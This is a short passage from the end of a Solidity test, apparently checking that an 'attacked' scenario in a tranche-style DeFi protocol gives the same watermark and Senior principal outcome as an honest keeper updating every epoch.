        _log("honest keeper every epoch", honest);
        assertEq(honest.highWaterMark, attacked.highWaterMark, "same watermark cut as the attack");
        assertEq(honest.seniorPrincipal, attacked.seniorPrincipal, "same Senior outcome as the attack");
        assertGe(control.seniorPrincipal - honest.seniorPrincipal, RECAP_SURPLUS - 5e6, "Senior loses at least X");
    }

}
```
